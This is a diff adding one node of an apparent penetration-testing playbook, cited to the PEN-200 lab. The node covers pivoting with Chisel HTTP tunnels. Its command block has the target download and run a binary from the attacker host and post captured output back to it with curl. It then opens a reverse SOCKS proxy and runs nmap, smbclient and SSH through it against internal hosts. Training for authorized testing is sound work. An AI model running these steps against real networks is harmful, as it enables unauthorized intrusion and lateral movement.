@@ -1,0 +1,22 @@
+{
+  "id": "chisel",
+  "phase": "PIVOT",
+  "title": "Chisel — HTTP Tunneling",
+  "body": "Chisel encapsulates traffic in HTTP — bypasses Deep Packet Inspection that blocks SSH/raw TCP. Uses SSH protocol inside the HTTP tunnel so traffic is encrypted. Client/server model with reverse SOCKS proxy.",
+  "cmd": "# ── SETUP ON KALI ────────────────────────────────────\n# Start chisel server with reverse tunnel enabled\nchisel server --port 8080 --reverse\n# Listening on http://0.0.0.0:8080\n\n# Serve chisel binary via Apache for target to download\nsudo cp $(which chisel) /var/www/html/\nsudo systemctl start apache2\n\n# ── GLIBC VERSION MISMATCH FIX ───────────────────────\n# If target gets: \"GLIBC_2.32/2.34 not found\" error\n# = Kali chisel compiled with Go 1.20+ won't run on older targets\n# Fix: use chisel 1.8.1 compiled with Go 1.19:\nwget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz\ngunzip chisel_1.8.1_linux_amd64.gz\nmv chisel_1.8.1_linux_amd64 chisel\nsudo cp chisel /var/www/html/\n\n# ── DEBUG — capture error output from target ─────────\n# If chisel client fails silently, use this to get error back:\n/tmp/chisel client $lhost:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://$lhost:8080/\n# tcpdump on Kali will show the error in the POST body:\nsudo tcpdump -nvvvXi tun0 tcp port 8080\n\n# ── TRANSFER + RUN CLIENT ON TARGET ──────────────────\n# Download on target:\nwget http://$lhost/chisel -O /tmp/chisel && chmod +x /tmp/chisel\n\n# Start chisel client (reverse SOCKS):\n/tmp/chisel client $lhost:8080 R:socks > /dev/null 2>&1 &\n\n# Verify on Kali — SOCKS proxy port 1080 should appear:\nss -ntlp | grep 1080\n# tcp LISTEN 127.0.0.1:1080 = tunnel up\n\n# ── USE THE SOCKS PROXY ───────────────────────────────\n# Update proxychains config:\n# socks5 127.0.0.1 1080\n\n# Run tools through proxychains:\nproxychains nmap -sT -Pn -n --top-ports=20 10.4.50.215\nproxychains smbclient -L //172.16.50.217/ -U hr_admin\n\n# ── SSH THROUGH CHISEL SOCKS PROXY ────────────────────\n# Standard nc doesn't support SOCKS — install ncat:\nsudo apt install ncat\n\n# SSH via SOCKS proxy using ncat ProxyCommand:\nssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215\n# %h %p = SSH fills in host and port automatically\n\n# ── SINGLE PORT FORWARD (no SOCKS) ───────────────────\n# Forward specific port instead of full SOCKS:\n# On target:\n/tmp/chisel client $lhost:8080 R:4455:172.16.50.217:445\n# Kali now has localhost:4455 → internal target:445\n\n# ── WINDOWS TARGET ────────────────────────────────────\n# Download matching architecture binary from GitHub releases\n# Run same commands with .exe:\n.\\chisel.exe client $lhost:8080 R:socks",
+  "warn": "Chisel compiled with Go 1.20+ will fail on Ubuntu 20.04/older targets (GLIBC mismatch). Download chisel 1.8.1 from GitHub releases (Go 1.19 compiled) instead of using Kali's built-in version. Lab validated: PEN-200 Module 20.",
+  "choices": [
+    {
+      "label": "SOCKS proxy up — scan internal network",
+      "next": "pivot_portscan"
+    },
+    {
+      "label": "SOCKS proxy up — use proxychains",
+      "next": "ssh_tunnel"
+    },
+    {
+      "label": "Back to pivot methods",
+      "next": "pivot_start"
+    }
+  ]
+}
